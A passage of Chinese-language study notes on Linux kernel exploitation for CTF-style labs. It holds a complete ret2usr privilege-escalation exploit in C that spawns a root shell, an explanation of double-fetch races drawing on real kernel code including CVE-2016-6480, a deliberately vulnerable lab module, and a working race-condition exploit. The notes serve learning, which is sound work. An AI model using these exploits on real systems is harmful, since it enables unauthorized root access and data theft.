    join_data(&stack);
    join_data(commit_creds);
    join_data(swapgs_pfq);
    join_data(user_rflags);
    join_data(iretq);
    join_data(&get_shell);
    join_data(user_cs);
    join_data(user_rflags);
    join_data(&stack);
    join_data(user_ss);
    int fd = open("/proc/overflow", O_WRONLY);
    write(fd, payload, payload_len);
    return 0;
}
```

#### ret2usr

既然可以劫持返回地址，那么可以考虑将返回地址修改成用户程序的地址，那么就相当于以ring 0级别执行用户程序，进而直接提权

因此在用户程序中利用汇编写一段提权与返回用户态，则可以直接拿到root shell

覆盖内核函数返回地址为用户程序

![1580194333224](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580194333224.png)

用户程序中利用内联汇编写相应操作

![1580194496576](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580194496576.png)

布置好栈结构jmp去`swapgs`

![1580194553680](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580194553680.png)

执行到`iretq`

![1580194615577](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580194615577.png)

拿到root shell

![1580194700486](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580194700486.png)

完整paylaod

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>

#define commit_creds 0xffffffff81081290
#define prepare_kernel_cred 0xffffffff81081480
#define prdi_ret 0xffffffff8133791d
#define rax2rdi_prbp_ret 0xffffffff812858df
#define prcx_ret 0xffffffff810d7b73
#define rax2rdi_callrcx 0xffffffff81118825
#define rax2rdi_c_prbp_ret 0xffffffff812858dc
#define iretq 0xffffffff8100c93a
//#define swapgs 0xffffffff814ffe9c
#define swapgs_pfq 0xffffffff8100ce6a
#define back 0xffffffff8100bfad
#define prcx 0xffffffff810d7b73

char payload[1000] = {0};
int payload_len = 0;
unsigned long long user_cs, user_ss, user_rflags;
long long user_stack = 0;

void join_data(long long data)
{
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}

void join_str(char *buf)
{
    int len = strlen(buf);
    memcpy(payload + payload_len, buf, len);
    payload_len += len;
}

void launch_shell()
{
    execl("/bin/sh", "sh", NULL);
}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    asm(
        "nop\n"
        "mov %0, %%rax\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "push %5\n"
        "push %6\n"
        "push %7\n"
        "jmp %%rax\n"
        :
        : "r" (swapgs_pfq), "r" (user_ss), "r" (&user_stack), "r" (user_rflags), "r" (user_cs), "r" (&launch_shell), "r" (iretq), "r" (user_rflags)
        : "%rax"
    );
}


static void save_state() 
{
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

int main()
{   
    save_state();
    int stack;
    user_stack = &stack;
    join_str("AAAAAAAAAAAAAAAAAAAAAAAA");
    join_data(&user_stack);
    join_data(&get_root);
    int fd = open("/proc/overflow", O_WRONLY);
    write(fd, payload, payload_len);
    return 0;
}
```

ret2usr是基于`SEMP`保护未开启的条件下才能利用的，在开启情况下可以利用其他方法绕过，以后具体分析

### Heap Corruptions

http://pwn4.fun/2017/06/12/Exploiting-Linux-Kernel-Heap-Corruptions/

### 

### UAF

### Double Fetch

`Double Fetch`是`Race Condition`的一种，通常是用户态与内核态之间的数据访问竞争，这是在symmetric multiprocessing （SMP）系统才会出现的漏洞，多核机制使得不同的进程可以同时执行相同的代码，导致了条件竞争

我们知道三个事实

1. 每个用户进程有其自己的虚拟内存空间
2. 每个用户进程的虚拟内存空间是孤立的
3. 内核可以访问所有用户进程的内存空间

![1580216809764](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580216809764.png)

一个进程在内核对数据进行验证后，另一个进程对数据进行了修改，从而使内核使用非法数据

![“double fetch”的图片搜索结果](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch.png)

数据在用户态与内核态之前传递，通常只需要传递一次，如果数据是个结构体变量，或者说数据含有可变类型或者长度，则往往需要第二次传递，或者多次传递。这类数据经常由header与body两部分构成，在获取body这一次数据传递时，很容易发生`Double Fetch`漏洞，有以下三种主要情况

1. Type Selection

第一次传递根据header决定数据类型，根据不同类型来接受第二次传递，在这之间修改了数据，则造成数据与类型不匹配，如`cxgb3 main.c `中的一段代码

```c
static int cxgb_extension_ioctl(struct net_device *dev,void __user *useraddr)
{
	u32 cmd;
	if (copy_from_user(&cmd, useraddr, sizeof(cmd)))
		return -EFAULT;
	switch (cmd) {
	case CHELSIO_SET_QSET_PARAMS:{
		struct ch_qset_params t;
		if (copy_from_user(&t, useraddr, sizeof(t)))
			return -EFAULT;
		if (t.qset_idx >= SGE_QSETS)
			return -EINVAL;
	break;
	}
	case CHELSIO_SET_QSET_NUM:{
		struct ch_reg edata;
		if (copy_from_user(&edata, useraddr, sizeof(edata)))
			return -EFAULT;
		if (edata.val < 1 ||(edata.val > 1 && !(...)))
			return -EINVAL;
	break;
	}
	case CHELSIO_SETMTUTAB:{
		struct ch_mtus m;
		if (copy_from_user(&m, useraddr, sizeof(m)))
			return -EFAULT;
		if (m.nmtus != NMTUS)
			return -EINVAL;
		if (m.mtus[0] < 81)
			return -EINVAL;
	break;
	}
}
```

在 `line 4`时获取了一次数据，并且根据数据类型，选择不同的结构体去接受数据，假如获取到的是`CHELSIO_SET_QSET_PARAMS`，那么进入`line 8`的语句，在`line 9`获取数据前，数据被修改成了`CHELSIO_SET_QSET_NUM`，那么就是以`ch_reg`为结构的变量赋给了`ch_qset_params`结构体，造成了数据类型异常

2. Size Checking

第一次传递根据header获取`size`，申请对应大小的`buf`，第二次传递接受数据存入`buf`

如果一直使用第一次传递的`size`，那么溢出是可以避免的，若是其他语句中从第二次传递的数据来获取`size`，那么难免会发生溢出，看`CVE-2016-6480 `中的漏洞代码

```c
static int ioctl_send_fib(struct aac_dev* dev,void __user *arg)
{
	struct hw_fib * kfib;
    ...
	if (copy_from_user((void *)kfib, arg, sizeof(...))) {
		aac_fib_free(fibptr);
		return -EFAULT;
	}
    ...
	size = le16_to_cpu(kfib->header.Size) + sizeof(...);
	if (size < le16_to_cpu(kfib->header.SenderSize))
		size = le16_to_cpu(kfib->header.SenderSize);
	if (size > dev->max_fib_size) {
		kfib = pci_alloc_consistent(dev->pdev, size, &daddr);
	}
	if (copy_from_user(kfib, arg, size)) {
	retval = -EFAULT;
	goto cleanup;
	}
	if (kfib->header.Command == cpu_to_le16(...)) {
        ...
	} else {
		retval = aac_fib_send(le16_to_cpu(kfib->header.Command),...
					le16_to_cpu(kfib->header.Size) , FsaNormal,
					1, 1, NULL, NULL);
        ...
	}
}
```

`line 5`这里先读取了一次数据，用来确定`size`（`line 10`->`line 12`），然后在`line 14`申请了`buf`，最后在`line 16`根据`size`读取了数据，如果在此之前修改了`arg`指向的内容，也就是用户数据，则读到`kfib`的数据，可以是异常数据，进一步，在`line 24`中引用到了`klib->header.Size`，这原本是第一次读取时验证的`size`，如果第二次读取时被恶意线程修改成很大的数，就会造成缓冲区溢出

3. Shallow Copy

这种数据传递通常是结构体类型的变量传递，结构体中包含了指针，当把这个数据传递进内核时，只是得到了结构体的数据，也就是浅拷贝，如果对结构体中的指针验证过后使用之前，恶意线程修改了这个指针，便是绕过了验证



以一个简单的例子来分析，模块 double_fetch.c内容如下

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>

struct file_operations fops;
char secret[] = "Double Fetch is great!";
struct t{
    long long flag;
    char *buf;
};

void double_fetch_ioctl(struct file *file, unsigned int cmd, struct t *arg){
    switch(cmd){
    case 0x1001:
        printk("Secret at %p.\n", secret);
        break;
    case 0x1002:
        if(arg->flag){
            if(arg->buf == &secret){
                printk("You can not see secret.\n");
                return;
            }
            int i = 0;
            printk("Checking...\n");
            msleep(50);
            int len = strlen(arg->buf);
            for(i = 0; i < len; i++){
                if(arg->buf[i] != secret[i]){
                    printk("Your message is wrong.\n");
                    return;
                }
            }
            printk("The secret is : \"%s\".\n", arg->buf);
        }else{
            printk("You don't want to get it.\n");
        }
        break;
    default:
        printk("ERROR\n");
        break;
    }
}

int double_fetch_write(struct file *file, const char *buf, unsigned long len){
    printk("You write something.\n");
    return len;
}

void double_fetch_read(struct file *file, const char *buf, unsigned long len){
    printk("You read something.\n");
}

static int __init double_fetch_init(void){
    fops.read = double_fetch_read;
    fops.write = double_fetch_write;
    fops.unlocked_ioctl = double_fetch_ioctl;
    printk(KERN_ALERT "double_fetch driver init!\n");
    create_proc_entry("double_fetch", 0666, 0)->proc_fops = &fops;
    return 0;
}

static void __exit double_fetch_exit(void){
    printk(KERN_ALERT "double_fetch driver exit\n");
}

module_init(double_fetch_init);
module_exit(double_fetch_exit);
```

在该模块中注册的`ioctl`函数提供两个功能

- `0x1001`会输出模块中`secret`的地址
- `0x1002`会对参数进行验证，这里的参数是一个结构体指针，拥有两个成员，一个`flag`标志位与一个`buf`指针，当标志位为真且buf指针不能是内核中的`secret`地址，如果`buf`与`secret`内容相同，则输出

那么如何获取这个`secret`内容，可以使用`Shallow Copy`的问题，在`0x1002`中，对buf指针验证与内容验证中间，我写了一个`msleep(50)`来程序堵塞情况，在这`50ms`的时间间隔里，如果修改`buf`指针变成`secret`的地址，则可以成功输出`secret`的内容

如何在这`50ms`内，对`buf`指针进行修改，这就是`Double Fetch`的重点所在

我们知道如今的多任务处理系统，看起来多个程序在同时运行，其实是CPU与操作系统一起营造的假象，事实是由操作系统来调度，当CPU处理程序A时，因为某种原因需要等待，那么CPU转而去处理程序B，回头再来处理A，当 CPU速度足够快时，看起来就是程序A，B同时运行

所以我们需要另一个线程来修改`buf`指针，主线程不断地调用`0x1002`的功能，另一个线程则不断的修改`buf`指针，当主线程中完成了对`buf`的检查后，在那`50ms`的间隔里，另一个线程修改了`buf`指针指向了`secret`，则下面的逐字符比较其实就是自身比较，则可以输出`secret`内容了

![1580283837457](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580283837457.png)

pwn.c内容

```c
// gcc pwn.c -static -lpthread -o pwn 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#define secret_at 0xffffffffa00002b0

struct t{
    long long flag;
    char *buf;
};

char ok = 1;

void change(struct t* p){
    int i;
    while(ok){
        p->buf = secret_at;
    }
}

char junk[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

int main(){
    int fd = open("/proc/double_fetch", O_WRONLY);
    ioctl(fd, 0x1001, 0);
    pthread_t t1;
    struct t fake;
    fake.flag = 1;
    fake.buf = &junk;
    pthread_create(&t1, NULL, change, &fake);
    int i;
    for(i = 0; i < 10; i++){
        fake.buf = &junk;
        ioctl(fd, 0x1002, &fake);
    }
    ok = 0;
    pthread_join(t1, NULL);
    close(fd);
    
    return 0;
}
```

由于这里需要多线程的支持，qemu启动也得开启多线程的功能

```
-smp 2,cores=2,threads=1  \
```

同时也要关闭`SMAP`，因为在内核中引用了用户态数据

https://forum.ubuntu.com.cn/viewtopic.php?t=268280

https://www.freebuf.com/articles/system/156485.html

# Example

# Reference

[linux kernel pwn notes](https://www.cnblogs.com/hac425/p/9416886.html)

[linux内核调试](https://xz.aliyun.com/t/2024)

[BruceFan's Blog](http://pwn4.fun/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/)